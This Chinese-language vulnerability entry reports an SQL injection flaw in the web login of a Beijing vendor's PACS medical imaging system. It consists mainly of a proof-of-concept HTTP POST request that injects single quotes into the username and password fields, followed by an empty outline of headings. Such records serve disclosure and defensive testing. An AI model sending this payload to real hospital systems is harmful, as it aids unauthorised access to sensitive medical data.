# 北京新网医讯技术有限公司PACS系统web端存在SQL注入漏洞

- **系统**：北京新网医讯技术有限公司PACS系统web端　|　**类型**：SQL注入　|　**CVE**：—
- **请求**：`POST / HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 448`

**请求体 / payload**
```
__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=aIvFnTxaMev%2BMuIasFWPO9198V98WVrTouBNTXTfDdlwXSECHrd5D4RQ6ge5pTRoYihFHyOQ1PfpTf5vaxEjyLRsSb73HPQsKfEOglWjAGo%3D&__EVENTVALIDATION=71o1HhunkN1yKTj5EmZeDoRkcgp5eEkODmWMf4usLX6jNBDWUPDiJBL7MyjboG6J9tKBMrpLafBCb7uKUMvQf5D5fJaarcxn0qfuG00MPr%2FuQJ4dDvXykErSvcEapjM99c2NwAq2u065oiyocPT%2FS%2BV%2BfU0lhZSlV5wDem2SrRLB38wmsXsy5dcVI8zEXxxy&TextName=admin'&TextPwd=admin'&BtnLogin=%E7%99%BB%E5%BD%95
>
```

**其他**
- 北京新网医讯技术有限公司PACS系统web端存在SQL注入漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、特征
+ 四、漏洞复现
---
- 版本: + 北京新网医讯技术有限公司PACS系统web端